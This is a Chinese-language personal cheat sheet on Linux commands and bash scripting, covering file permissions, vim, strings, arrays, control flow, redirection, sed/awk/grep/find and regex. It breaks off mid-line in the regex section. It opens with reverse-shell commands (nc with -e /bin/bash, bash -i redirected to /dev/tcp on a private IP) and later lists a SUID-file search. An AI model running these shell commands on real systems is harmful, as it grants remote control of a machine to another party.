linux 命令行操作(bash)

建立shell

nc -lvnp 8010

nc 127.0.0.1 8010 -e /bin/bash

nc -lvnp 8080

bash -i >& /dev/tcp/192.168.31.41/8080 0>&1

chgrp [-R] 属组名 文件名 #更改文件属组 -R 递归更改文件属组

chown [–R] 所有者 文件名

chown [-R] 所有者:属组名 文件名

chmod [-R] xyz 文件或目录

chmod u=rwx,g=rx,o=r 文件名

chmod u+r 文件名

pwd 显示当前所在目录

pwd -P 显示确实的路径而不是link路径

mkdir [-mp] 目录名称       -p递归创建目录

 rmdir [-p] 目录名称   仅仅能删除空的目录

cp [-afpri] source destionation       -a 相当于 -pdr    -p是联通文件属性一起复制，而非使用默认属性（备份常用）-r 递归复制 -i 询问是否覆盖 -d 若来源是链接档的属性，则复制链接当属性而非文件本身

rm [-rfi] 文件或目录     -f 强制删除 -r 递归删除 -i 询问是否动作

mv [-fiu] source destination -f 强制覆盖 -i 询问覆盖 -u 若目标比较新，才会升级

cat 由第一行显示文件内容

tac 由最后一行显示文件内容  是cat 倒着写的

nl  显示行号

more 一页一页的显示文件内容

less 与more类似，但可向前翻页

head [-n] 只看头几行

tail [-n] 只看尾巴几行

ln f1 f2        创建f1的硬连接f2 

ln -s f1 f3    创建f1的软连接f3

f1 改变，f2,f3改变

f1 删除，f2不受影响,f3无效

用户登录必须要有家目录和密码，且家目录权限必须可写可执行

最简创建 

useradd -m 用户名 ; passwd 用户名

useradd [-cdgGsu]

  -c comment 指定一段注释性描述

  -d 目录 指定用户主目录，如果此目录不存在，则同时使用-m选项，可以创建主目录

  -g 指定用户所属的用户组

  -G 指定用户所属的附加组

  -s shell 指定用户登录shell

  -u 指定用户的用户 如果同时有-o选项，则可以重复使用其他用户的标识号

usermod

  -g 指定用户所属组

  -G 覆盖用户所属的附加组

userdel [-r] 用户名  删除用户 -r 删除用户以及主目录

passwd [-ludf] 用户 -f 强制用户下次登陆时修改口令 -d使账号无口令 -u 口令解锁 -l 锁定口令，禁用账号

groupadd [-go]  用户组 -g指定新用户组的GID -o 表示新用户组的GID 可以与已有用户组的GID相同

groupdel 用户组 删除用户组

groupmod [-gon] 用户组 -g GID -o 表示新用户组的GID 可以与已有用户组的GID相同 -n 更改用户组名字

newgrp root   将当前用户切换到root用户组 ，前提是root用户组是该用户的主组或附加组

df [-ahikHTm]  -h 以人类可读的方式显示输出结果，-k 以KB为单位显示磁盘使用情况（默认）-T显示文件系统的类型 -a 显示虚拟文件系统 -i显示inode使用情况

df -aT

du [-ahskm] -a 列出所有文件与目录容量 -h 以人们易读的容量格式（G/M）显示 -s 仅显示指定目录或文件总大小，不显示子目录大小 -k 以KBytes格式列出容量显示 -m 以MBytes 列出容量显示

fdisk -l 查看是否有U盘等存储空间

mkfs

mkfs -t ext4 /dev/sdb1 将/dev/sdb1格式化为ext4格式 （必须为未挂载格式）

fsck /dev/sdb1 检查修复未挂载的磁盘

挂载u盘操作 

fdisk -l

mkdir -p /mnt/usb

mount /dev/sdb1 /mnt/usb    

umount -l /mnt/usb  -l 强制退出挂载

ls &  #这里的&是指将这一条命令放到后台执行

jobs #可以看后台作业

fg #将后台作业转变为前台作业

------

vi/vim

![img](D:\communication\wechat\Documents\xwechat_files\wxid_vzo12jkdo61622_6285\business\favorite\temp\微信图片_20260215230016_1311.jpg)



命令模式、输入模式和命令行模式

[i] 切换到输入模式，在光标当前位置开始输入文本。（需要处于命令模式）

​    I 到行首插入

​    a 切换到插入模式在光标下一个位置开始输入文本

​    A 在行尾添加

​    o 在当前行的下方插入一个新行，并进入插入模式

​    O 在当前行的上方插入一个新行，并进入插入模式 

​    r 替换一个字符

​    R 替换模式

​    s 删除字符并进入插入模式

​    S 删除行并进入插入模式

[Esc] 返回命令模式

[:] 切换到底线命令模式 （需要处于命令模式）

输入模式 

方向键移动光标

鼠标点击光标位置

page up/page down 上/下翻页

insert 切换光标为输入/替换模式

命令模式（一般模式）

h光标向左移动

l光标向右移动

j光标向下移动

k光标向上移动

5j 光标向下移动5行

w / b 后一个单词，前一个单词

dw / yw 删除一个单词/复制一个单词

[Ctrl] + [f] 屏幕向下移动一页 相当于 page down

​    [Ctrl] + [d] 屏幕『向下』移动半页 

[Ctrl] + [b] 屏幕『向上』移动一页  相当于page up

​    [Ctrl] + [u] 屏幕『向上』移动半页 

n n表示数字 按下20光标会向右移动20个字符距离相当于20l

n n 为数字。光标向下移动 n 行(常用)相当于nj 

0 或功能键[Home] 移动到这一行的最前面字符处 (常用)

$ 或功能键[End] 移动到这一行的最后面字符处(常用)

G 移动到这个档案的最后一行(常用) 

nG n 为数字。移动到这个档案的第 n 行。例如 20G 则会移动到这个档案的第 20 行(可配合 :set nu) 

gg 移动到这个档案的第一行，相当于 1G 啊！(常用) 

H 光标移动到这个屏幕的最上方那一行的第一个字符 

M 光标移动到这个屏幕的中央那一行的第一个字符 

L 光标移动到这个屏幕的最下方那一行的第一个字符 

/word ?word 向光标之上/下寻找一个字符串为word的字符串

n N 重复前一个搜索动作

:n1,n2s/word1/word2/g  在第n1，n2行之间查找word1，并将其替换为word2

:1,$s/word1/word2/g   从第一行到最后一行

:10,20s/^/#/g 在10~20行添加#注释

:10,20s/^/\/\//g  在10~20行添加//注释

x, X 向后/向前删除一个字符

dd 剪切当前行

  ndd

d1G 删除光标所在到第一行的所有数据

dG 删除光标所在行到最后一行的所有数据

d$ 删除游标所在处，到该行的最后一个字符 

d0 那个是数字的 0 ，删除游标所在处，到该行的最前面一个字符 

yy 复制当前行

  nyy,y1G,yG,y$,y0

p 粘贴到光标下方

P 粘贴到光标上方

J 将光标所在行与下一行的数据结合成同一行 

u 撤销上一次操作

[ctrl + r] 返回撤销上一次之前的结果

. 重复上一个动作，例如删除就是删除

:w 保存文件

:q 退出

:q! 强制退出不保存修改

:wq 保存退出

:w [filename] 将编辑的数据存储为另一个档案

:r [filename] 将filename的文件粘贴到光标后面

:n1,n2 w [filename] 将 n1 到 n2 的内容储存成 filename 这个档案。 

:1,$w [filename]   从第一行到最后一行的内容存储成filename这个档案

:! command

:set nu 显示行号，设定之后，会在每一行的前缀显示该行的行号 

:set nonu 与 set nu 相反，为取消行号！ 

------

bash

\#!/bin/bash

命令执行

$()

``

your_name="qinjx"

readonly him_name     #只读变量，不能更改

unset variable_name

变量被删除后不能再次使用。unset 命令不能删除只读变量。

注释#

多行注释

:<

...

...

A

或者

: '

这是注释的部分。

可以有多行内容。

'

------

字符串

'abc' "abc"  

\#单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的

\#双引号里可以有变量，双引号里可以出现转义字符

拼接字符串 (单或者双)

echo "who are you" "i am fine\!"

who are you i am fine!

echo 'who are you' 'i am fine\!'

who are you i am fine\!

echo 'hello ${name}'

hello ${name}

获取字符串长度

string="1/2/3/4/5"

echo ${#string}  #变量为字符串时 ${#string} 等价于 ${#string[0]}

提取子字符串

左面第一个字符用0表示，右面第一个字符用0-1表示

\#/## 表示从左边开始删除。一个 # 表示从左边删除到第一个指定的字符；两个 # 表示从左边删除到最后一个指定的字符。

%/%% 表示从右边开始删除。一个 % 表示从右边删除到第一个指定的字符；两个 % 表示从左边删除到最后一个指定的字符。

echo ${string#*/}  删除第一个/及其左面的字符::2/3/4/5

echo ${string##*/} 删除最后一个/及其左面的字符::5

echo ${string%/*} 删除右面第一个/及其右面的字符::1/2/3/4

echo ${string%%/*} 删除右面最后一个（最左面第一个）/及其右面的字符::1

echo ${string:1:4}  #从第二个开始，提取4个字符::2/3/

echo ${string:4} #从第五个字符开始，到结束::/4/5

echo ${string:0-2:3} #从右数第二个字符开始，向右取三个字符::/5

echo ${string:0-2} #从右数第二个字符开始，到结束::/5

查找子字符串

string="runoob is a great site"

echo `expr index "$string" io` 查找i或者o第一个出现的位置（索引）

newname=1.txt

echo ${newname},${newname/txt/gjf},${newname//txt/gjf}     /替换首个 //替换全局

::1.txt,1.gif

------

整数

1 2 3

  declare -i my_integer=42

------

数组

my_array=(1 2 "3" 4 5)

my_array[0]=1

my_array=(

1

2

"3"

)

读取数组

${数组名[下标]}

${array_name[@]}   # 获取数组中所有元素

length=${#array_name[@]} #获取数组元素的个数 length=${#array_name[*]}

关联数组 

declare -A site=(["google"]="www.google.com" ["runoob"]="www.runoob.com" ["taobao"]="www.taobao.com")

declare -A associative_array

associative_array["name"]="john"

associative_array["age"]=30

echo "数组的元素为: ${site[*]}"

echo "数组的元素为: ${site[@]}"

echo "数组元素个数为: ${#my_array[*]}" 

echo "数组元素个数为: ${#my_array[@]}"

echo "数组元素个数为: ${#my_array}" 

echo "数组元素个数为: ${#my_array}"

数组的元素为: www.google.com www.runoob.com www.taobao.com

数组的元素为: www.google.com www.runoob.com www.taobao.com

数组元素个数为: 4

数组元素个数为: 4

数组元素个数为: 4

数组元素个数为: 4

A=1

my_array=($A B)

echo ${my_array[@]}

1 B

\#!/bin/bash

a1=ni

a2=hao

a3=lili

for i in 1 2 3 ; do

​        eval echo "\$a$i"

ni

hao

lili

字符串转数组

\#!/bin/bash

words="aaa bbb ccc ddd"

wo1=($words)

wo2=(`echo ${words} | tr ' ' '\n' `)

echo $wo1

echo ${wo1[*]}

echo $wo2

echo ${wo2[*]}

aaa

aaa bbb ccc ddd

aaa

aaa bbb ccc ddd

------

参数传递

\--------------------

\#!/bin/bash

echo $1

echo $2

echo $3

echo "---"

echo "$#"

echo "$*"

echo "$@"

echo "$$"

echo "$!"

echo "$?"

echo "$-"

\--------------------

main.sh 1 2 3

1

2

3

\---

3

1 2 3

1 2 3

262949

0

hB

\--------------------

$* 与 $@ 区别：

相同点：都是引用所有参数。

不同点：只有在双引号中体现出来。假设在脚本运行时写了三个参数 1、2、3，则 " * " 等价于 "1 2 3"（传递了一个参数），而 "@" 等价于 "1" "2" "3"（传递了三个参数）。

------

优先使用 [[ ]] 和 || &&

支持正则表达式：[[ "$var" =~ ^[0-9]+$ ]]

(()) 只获取真假 常用于条件判断

$(()) 用于算数运算，并返回运算结果

运算符

算数运算符

 \+ - * / % = == !=

val = `expr 2 + 2`

val2 = `expr 2 \* 2`   *号需要加\转义

关系运算符

-eq -ne -gt -lt -ge -le

布尔运算符

!  -o  -a      (非，或，与)

[ ! $a ]

[ $a -lt 20 -o $b -lt 20 ]

逻辑运算符

&& ||   （and or）

[[ $a -lt 100 && $b -gt 100 ]]

字符串运算符

= != 

-z  检测字符串长度是否为0，为0返回true  [ -z $a ] 

-n  检测字符串长度是否不为0，不为0返回true

$  检测字符串长度是否不为空，不为空返回true

文件测试运算符

-b 检查文件是否为块设备文件，如果是，则返回true

-c 检查文件是否是字符设备文件，如果是，则返回true

-d 检查文件是否是目录，如果是，则返回true

-f 检查文件是否是普通文件，如果是，则返回true

-g 检查文件是否设置了SGID位，如果是，则返回true

-k 检查文件是否设置了粘着位，如果是，则返回true

-p 检查文件是否是有名管道，如果是，则返回true

-u 检查文件是否设置了SUID，如果是，则返回true

-r -w -x 检查文件是否可读，可写，可执行，如果是，则返回true

-s 检查文件是否为空（文件大小是否大于0），不为空返回true

-e 检查文件是否存在，如果是，则返回true

-S 检查文件是否socket

-L 检查文件是否存在并且是一个符号链接

自增自减操作符

num=5

let ++

let --

num=$((num + 1))

num=$((num - 1))

num=$(expr $num + 1)

num=$(expr $num - 1)

((num++))

((num--))

------

文件包含

. filename 

source filename

被包含的文件不需要可执行权限

------

输入与输出

echo $your_name

echo ${your_name}

echo -n "load ..."

echo "done!"

::load ...done!

echo -e "hello\nworld"

::hello

::world

转义字符\n 换行符  \t 制表符  \v 垂直制表符  \b 退格  \r 回车  \" 双引号  \' 单引号  \\ 反斜杠本身

 能否引用变量  |  能否引用转移符  |  能否引用文本格式符(如：换行符、制表符)

单引号  |           否           |             否             |                             否

双引号  |           能           |             能             |                             能

无引号  |           能           |             能             |                             否                       

read 命令一个一个词组地接收输入的参数，每个词组需要使用空格进行分隔；如果输入的词组个数大于需要的参数个数，则多出的词组将被作为整体为最后一个参数接收。

read -p "input a val:" a  #-p是设置提示词

read -p "input b val:" b

r=$[a+b]

echo ${r}

-n 输入长度限制

-t 输入限时

-s 隐藏输入内容

-p 输入提示文字

printf

printf "Hello, %s\n" "$name"

%s：字符串

%d：十进制整数

%f：浮点数

%c：字符

%x：十六进制数

%o：八进制数

%b：二进制数

%e：科学计数法表示的浮点数

%-10s 指一个宽度为 10 个字符（- 表示左对齐，没有则表示右对齐）

%-4.2f 指格式化为小数，其中 .2 指保留 2 位小数。

printf "%-10s %-8s %-4.2f\n" 郭靖 男 66.1234

------

流程控制

if [[ ${a} > ${b} ]] ; then

  ..

else

  ..

fi

if [[ ${a} > ${b} ]] ; then

  ..

elif (( ${a} > ${b} ) ; then

  ..

else

  ..

fi

for var in item1 item2 item3 ... item4 ; do

  ..

done

for((i=1;i<=5;i++)) ; do    #类C写法

  echo 12;

done

for var in item1 item2 item3 ... item4 ; do command1; command2... done;

while (( $int<=5 ))

do

  ..

done

abb=1 ; while (( abb<5 )) ; do echo $abb ; let abb++ ; done

abb=1 ; while true ; do echo $abb ; let abb++ ; done  #无限循环

until condition     #如果condition返回值为false ,则继续执行循环体内的语句

do

  ..

done

case $aNum in

​    1)  echo '你选择了 1'

​    ;;

​    2)  echo '你选择了 2'

​    ;;

​    *)  echo '你没有输入 1 到 2 之间的数字'

​    ;;

esac

case $num in

1) echo 1

  ;;

2) echo 2

  ;;

  *) echo "done"

  ;;

esac

break 命令允许跳出所有循环（终止执行后面的所有循环）。

continue 命令与 break 命令类似，只有一点差别，它不会跳出所有循环，仅仅跳出当前循环。

------

函数

[ function ] funname [()]

{

  ..;

  [return int;]

}

函数返回值在调用该函数后通过 $? 来获得。

和 C 语言不同，shell 语言中return 0 代表 true，0 以外的值代表 false。

function fun(){ return 0 };if fun;then echo 1;fi

::1

function fun(){ return 1 };if fun;then echo 1;fi

::

funWithParam(){

​    echo "第一个参数为 $1 !"

​    echo "第二个参数为 $2 !"

​    echo "第十个参数为 $10 !"

​    echo "第十个参数为 ${10} !"

​    echo "第十一个参数为 ${11} !"

​    echo "参数总数有 $# 个!"

​    echo "作为一个字符串输出所有参数 $* !"

}

funWithParam 1 2 3 4 5 6 7 8 9 34 73

------

输入输出重定向

\>  重定向输出到某个位置，替换原有文件的所有内容(输出重定向)

\>>  重定向追加到某个位置，在原有文件末尾添加内容

<  重定向输入某个文件位置(输入重定向)

  echo -e "/home" > 1.txt

  ls < 1.txt

  wc -l < 1.txt

ls < 1.txt > 2.txt   从文件 1.txt 中读取内容，传递给ls，再将结果输出到2.txt

默认情况下，command > file 将 stdout 重定向到 file，command < file 将stdin 重定向到 file。

2> 重定向错误输出

2>> 重定向错误输出到文件末尾

如果希望 stderr 重定向到 file，可以这样写：

$ command 2>file

如果希望 stderr 追加到 file 文件末尾，可以这样写：

$ command 2>>file

&>  混合输出错误的和正确的都输出

n >& m 将输出文件m和n合并

n <& m 将输入文件m和n合并

文件描述符 0 通常是标准输入（STDIN），1 是标准输出（STDOUT），2 是标准错误输出（STDERR）。

here document (和多行注释类似，将 : 替换为接受输入的命令)

wc -l << A

​    欢迎来到

​    菜鸟教程

​    www.runoob.com

A

3          # 输出结果为 3 行

/dev/null

2>/dev/null #将错误输出到/dev/null 即扔掉错误输出

\>list 2>&1  

stdout重定向到list，stderr重定向到stdout，即是此时的list（>list的结果），所以输出stdout和stderr到list文件

------

vim 

tmux

sort

(sort -t ',' -k2n #指定分隔符为','  -k2 第二列，n 使用数字排序 g是浮点数，空是字符串 )

uniq

(cat 2.txt | sort | uniq #常用于去重)

cut

(cat /etc/passwd | cut -d ':' -f 2 #按：分割，取第二列)

paste

 (cat /etc/passwd | paste -sd ","#-s 串行进行，而非平行处理，-d间隔字符)

tr

(echo "i love you" | tr ' ' '\n'#简单替换)

seq 

(seq 5 #输出1 2 3 4 5这五行数字)

cat tac head(-n) tail(-n) less(-r) more nl od(二进制打开)

rev(行反序) wc -l(输出行号)

https://topicbolt.com/flip-text-vertically/ #vertical flip string 

grep

grep [-ivnr]  -i 忽略大小写 -v 反向查找 -n 显示匹配行行号 -r 递归查找子目录中的文件（在当前目录下查找）

-A 5 显示匹配行以及之后的5行

-B 5 显示匹配行以及之前的5行

-C 5 显示匹配行以及之前和之后的5行

grep -E 拓展正则表达式

grep -P perl正则表达式 能匹配 \d （数字类）等等

grep -P ''    正则表达式匹配

sed

sed 's/old/new/ig'      i 忽略大小写 g 全局匹配     

sed '/pattern/d'          删除匹配到pattern的行

sed '2,5d'                    删除2-5行

sed -n '3p'                    打印第三行

sed -n '/pattern/p'      打印匹配行

sed '3i\插入内容'           在第三行前插入

sed '3a\追加内容'          在第三行后追加

sed '3c\新内容'             替换第三行

sed '/pattern/c\新内容     替换匹配行

awk

-F ' '            指定输入字符的分隔符

-v <变量名>=<值>:   设置awk内部的变量值

awk '{print $1,$2}'   打印特定行

awk  '{printf "%-10s %-10s\n", $1, $2}'  格式化输出

$ awk '$1>2 && $2=="Are" {print $1,$2,$3}' log.txt

过滤第一列大于2并且第二列等于'Are'的行

cat /etc/passwd | awk 'BEGIN{FS=":";OFS="::::"}{$1=$1 ; print $0}'  将分隔符:转变为::::，使用$1=$1,触发字段重组

cat /etc/passwd | awk 'BEGIN{ORS=":"}{print $0}'  将换行符替换为:

  FS(Field Separator)：输入字段分隔符， 默认为空白字符

  OFS(Out of Field Separator)：输出字段分隔符， 默认为空白字符

  RS(Record Separator)：输入记录分隔符(输入换行符)， 指定输入时的换行符

  ORS(Output Record Separate)：输出记录分隔符（输出换行符），输出时用指定符号代替换行符

  NF(Number for Field)：当前行的字段的个数(即当前行被分割成了几列)

  NR(Number of Record)：行号，当前处理的文本行的行号。

  FNR：各文件分别计数的行号

  ARGC：命令行参数的个数

  ARGV：数组，保存的是命令行所给定的各参数

if (condition) .... ; else .... 

if (condition1) .... ; else if (condition2) ... ; else .... 

awk '{if($3 > 50) print $1, $3}' filename    if使用

cat /etc/passwd | sort -t ':' -k4n | awk -vyes="yes" -vno="no" 'BEGIN{FS=":"}{if ($4 > 1000) print yes;else print no}' 提取passwd文档，按照第四列数字排序，第四列数字大于1000的行输出yes，否则输出no

$ awk 'BEGIN { for (i = 1; i <= 5; ++i) print i }'   

$ awk 'BEGIN {i = 1; while (i < 6) { print i; ++i } }'

break continue exit

locate

find

-name 按名字查找 支持* 和 ?

-type    按照文件类型查找 f普通文件 d目录 l符号链接

-perm 权限 -u=s 

-size [+-]   +是大于 -是小于  c字节 w字数 b块数 k kb M mb G gb

-mtime days   按修改时间查找，+ 之前 - 以内   比如 - 7 为7天以内 +7为七天以外 7 在7天前修改过

[a|c|m]min -- [最后访问|最后状态修改|最后内容修改]min

[a|c|m]time -- [最后访问|最后状态修改|最后内容修改]time

正数应该表示时间之前，负数表示时间之内。

find . -exec command { } \;   其中 {}是前面查找到的文件路径    

-user    按文件所有者查找

-group 按文件所属组查找

-perm 755 将匹配权限恰好为755的文件。

-perm -644 将匹配所有权限至少为644的文件

-perm /222 将匹配任意用户（所有者、组、其他）有写权限的文件。

-perm u=rwx,g=rx,o=rx

-perm -u=rwx  # 匹配所有者有读写执行权限的文件，即所有者权限至少为7（rwx）

-perm /u=rwx  # 匹配所有者有读写执行权限中任意一位的文件，即所有者权限至少有一个（x或w或r）

例子

find / -perm -u=s -type f 2>/dev/null      这里的-perm -u=s            -代表至少，意思是至少有 

curl

wget

ftp

tftp

tree

telnet

dig

touch scp ssh

sudo

skill

su -l Qsa3 -c "whoami" #以Qsa3权限执行一条命令whoami，并返回原shell环境

正则表达式

ifconfig | grep -E '(\d+\.){3}\d' 匹配777.777.777.777

ifconfig | grep -E '(([0-9]+).){3}([0-9])+'

ifconfig | grep -P '((25[0-5]|2[0-4][0-9]|[0-1]{0,}[0-9]{0,}[0-9])\.){3}(25[0-5]|2[0-4][0-9]|[0-1]{0,}[0-9]{0,}[0-9])'

修饰符(写在匹配行之外)

/pattern/i #i 忽略大小写 g 全局匹配 m 多行模式 s 单行模式

(默认情况下的圆点 . 是 匹配除换行符 \n 之外的任何字符，加上 s 之后, . 中包含换行符 \n)

used? #可以匹配use和used

? + * {n} {n,} {n,m}

(ab)+ #可以匹配ababab...

a (cat|dog) #可以匹配 a cat  或者 a dog

[a-z]+ #可以匹配所有字母1到多次    []内的内容都可以选取

\d 匹配任意数字，等价于 [0-9]

\D 匹配任意非数字，等价于 [^0-9]

\w 匹配任意单词字符(字母、数字、下划线)，等价于 [a-zA-Z0-9_]

\W 匹配任意非单词字符，等价于 [^a-zA-Z0-9_]

\s 匹配任意空白字符(空格、制表符、换行符等)

\S 匹配任意非空白字符

\n 匹配换行符

\t 匹配制表符

\r 匹配回车符

\f 匹配换页符

\v 匹配垂直制表符

[^a-z]    匹配除了a-z的字符

. 匹配任意字符，但不包括换行符

  . 特殊字符在中括号表达式时 如 [.] 只会匹配 .字符，等价于 \.，而非匹配除换行符 \n 外的所有字符。

^ 匹配行首  在[]之外使用 ^[a-z]    匹配以a-z开头的字符

$ 匹配行尾 在[]之外使用 [a-z]$    匹配以a-z结尾的字符

?懒惰匹配

<.+?>  尽可能的匹配少的字符   整体匹配HTML标签时不会跨标签匹配

\b

匹配单词边界

 示例：\bcat\b 匹配 "cat" 但不匹配 "category"

\B

匹配非单词边界

示例：\Bcat\B 匹配 "scattered" 中的 "cat" 但不匹配单独的 "cat"

高级用法

捕获分组()

非捕获分组(?:)

命名分组(?:)

-p perl规则下

(\w+) \1  # 匹配重复的单词，如 "hello hello"

(?P\w+) (?P=word)

正向先行断言 (?=pattern)  正前瞻  右（向前）  在 pattern  要找的位置，它的右边必须是... 

负向先行断言 (?!pattern) 负前瞻 向右（向前） 不存在 pattern 我要找的位置，它的右边一定不能是... 

正向后行断言 (?<=pattern) 正后顾 向左（向后） 存在 pattern 我要找的位置，它的左边必须是... 

负向后行断言 (?